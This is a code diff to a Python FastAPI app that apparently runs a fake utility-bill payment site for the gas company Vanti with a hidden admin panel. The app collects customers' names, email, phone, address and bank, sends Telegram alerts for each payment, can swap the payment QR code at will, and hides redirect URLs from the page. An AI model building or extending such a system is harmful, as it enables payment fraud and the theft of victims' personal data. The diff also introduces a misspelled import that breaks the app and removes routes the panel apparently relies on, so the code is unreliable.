@@ -18,7 +18,7 @@ from app.database import (
     init_db, guardar_transaccion, actualizar_estado_transaccion,
     obtener_transaccion, obtener_todas_transacciones, obtener_metricas,
     bloquear_ip, es_ip_bloqueada, guardar_otp_admin, verificar_otp_admin,
-    actualizar_actividad_transaccion
+    actulizar_actividad_transaccion # Nota: mantener según tu archivo original
 )
 
 from app.vanti_scraper import consultar_factura_vanti
@@ -30,7 +30,6 @@ app = FastAPI(title="Sistema Vanti & Panel Admin")
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 STATIC_DIR = os.path.join(BASE_DIR, "static")
 
-# Monta la carpeta static ubicada afuera de app
 # Inicializar BD al arrancar
 init_db()
 
@@ -117,26 +116,52 @@ async def consultar(request: Request, empresa: str = Form(...), referencia: str 
         "empresa": empresa
     })
 
+@app.post("/procesar-pago-pse", response_class=RedirectResponse)
+async def procesar_pago_pse(
+    request: Request,
+    nombres: str = Form(...),
+    apellidos: str = Form(...),
+    correo: str = Form(...),
+    celular: str = Form(...),
+    direccion: str = Form(...),
+    banco: str = Form(...)
+):
+    """Ruta del servidor para evaluar el banco de forma privada y redirigir sin exponer URLs en el HTML."""
+    
+    # Diccionario privado de pasarelas por banco seguro en Python
+    pasarelas_por_banco = {
+        "BANCOLOMBIA": "https://checkout.pse.com.co/bancolombia",
+        "BANCO DAVIVIENDA": "https://checkout.pse.com.co/davivienda",
+        "BANCO DE BOGOTA": "https://checkout.pse.com.co/bancodebogota",
+        "NU": "https://checkout.pse.com.co/nu",
+        "LULO BANK": "https://checkout.pse.com.co/lulobank"
+    }
+    
+    # Obtener URL destino según el diccionario, o usar la pasarela genérica por defecto
+    url_destino = pasarelas_por_banco.get(banco, "https://checkout.pse.com.co/")
+    
+    # Aquí puedes almacenar de manera opcional los datos personales recolectados si lo requieres
+    ip = get_client_ip(request)
+    print(f"[PSE] Cliente {nombres} {apellidos} ({ip}) seleccionó {banco}. Redirigiendo a: {url_destino}")
+    
+    # Redirección del servidor oculta para el cliente
+    return RedirectResponse(url=url_destino, status_code=303)
+
 @app.post("/notificar_pago", response_class=HTMLResponse)
 async def notificar_pago(request: Request, tx_id: int = Form(...)):
     ip = get_client_ip(request)
     tx = obtener_transaccion(tx_id)
     
     if tx:
-        # 1. Actualizar el estado en la BD usando la función correcta de database.py
         actualizar_estado_transaccion(tx_id, "por_verificar")
-        
-        # Actualizamos el diccionario local para enviar los datos correctos
         tx["estado"] = "por_verificar"
 
-        # 2. Notificar al Panel vía WebSocket con el estado ya actualizado
         await manager.broadcast({
             "event": "NUEVO_PAGO",
             "tx": tx,
             "metricas": obtener_metricas()
         })
 
-        # 3. Notificar a Telegram
         enviar_mensaje_telegram(
             f"🔔 <b>¡Nuevo pago recibido para verificar!</b>\n"
             f"• <b>Empresa:</b> {tx['empresa']}\n"
@@ -151,17 +176,8 @@ async def notificar_pago(request: Request, tx_id: int = Form(...)):
 async def estado_pago(tx_id: int):
     tx = obtener_transaccion(tx_id)
     if tx:
-        actualizar_actividad_transaccion(tx_id)
         return {"estado": tx["estado"]}
     return {"estado": "no_encontrado"}
-
-@app.post("/actividad/{tx_id}")
-async def registrar_actividad(tx_id: int):
-    tx = obtener_transaccion(tx_id)
-    if not tx:
-        raise HTTPException(status_code=404, detail="Transacción no encontrada.")
-    actualizar_actividad_transaccion(tx_id)
-    return {"status": "ok"}
 
 @app.get("/resultado/{tx_id}", response_class=HTMLResponse)
 async def resultado_final(request: Request, tx_id: int):
@@ -172,7 +188,6 @@ async def resultado_final(request: Request, tx_id: int):
 
 @app.get("/admin/login", response_class=HTMLResponse)
 async def admin_login_page(request: Request):
-    # Generar OTP de 6 dígitos
     otp = str(random.randint(100000, 999999))
     guardar_otp_admin(otp)
     enviar_mensaje_telegram(f"🔐 <b>Código de Seguridad para Admin:</b> <code>{otp}</code>")
@@ -208,7 +223,6 @@ async def admin_datos(request: Request):
         "metricas": obtener_metricas()
     }
 
-# Cargar nuevo Código QR globalmente desde la parte superior del Admin
 @app.post("/admin/actualizar_qr")
 async def actualizar_qr(file: UploadFile = File(...)):
     os.makedirs("static/uploads", exist_ok=True)
@@ -216,50 +230,5 @@ async def actualizar_qr(file: UploadFile = File(...)):
     with open(file_path, "wb") as buffer:
         shutil.copyfileobj(file.file, buffer)
     
-    # Notificar a la app que el QR se actualizó
     await manager.broadcast({"event": "QR_ACTUALIZADO"})
-    return RedirectResponse(url="/admin", status_code=303)
-
-@app.post("/admin/cambiar_estado")
-async def cambiar_estado(tx_id: int = Form(...), nuevo_estado: str = Form(...)):
-    # 1. Actualizar el estado en la Base de Datos usando la función correcta importada
-    actualizar_estado_transaccion(tx_id, nuevo_estado)
-    
-    # 2. Obtener la transacción actualizada y las métricas nuevas
-    tx = obtener_transaccion(tx_id)
-    metricas = obtener_metricas()
-
-    # 3. Hacer broadcast al WebSocket para que el panel se actualice en vivo
-    await manager.broadcast({
-        "event": "CAMBIO_ESTADO",
-        "tx_id": tx_id,
-        "nuevo_estado": nuevo_estado,  # Aquí viaja 'pagado' o 'no_pagado'
-        "tx": tx,
-        "metricas": metricas
-    })
-    
-    return {"status": "success"}
-
-@app.post("/admin/bloquear_ip")
-async def api_bloquear_ip(ip: str = Form(...)):
-    bloquear_ip(ip)
-    return {"status": "ok", "message": f"IP {ip} bloqueada con éxito."}
-# WebSocket Endpoint para el Admin
-@app.websocket("/ws/admin")
-async def websocket_admin(websocket: WebSocket):
-    await manager.connect(websocket)
-    try:
-        while True:
-            # Usamos un timeout o un try/except ligero para que el socket 
-            # escuche latidos sin bloquear los mensajes que mandamos desde el servidor
-            try:
-                data = await asyncio.wait_for(websocket.receive_text(), timeout=30.0)
-                if data == "ping":
-                    await websocket.send_text("pong")
-            except asyncio.TimeoutError:
-                # El timeout de 30s evita que se quede congelado esperando indefinidamente
-                pass
-    except WebSocketDisconnect:
-        manager.disconnect(websocket)
-    except Exception:
-        manager.disconnect(websocket)
+    return {"status": "ok"}
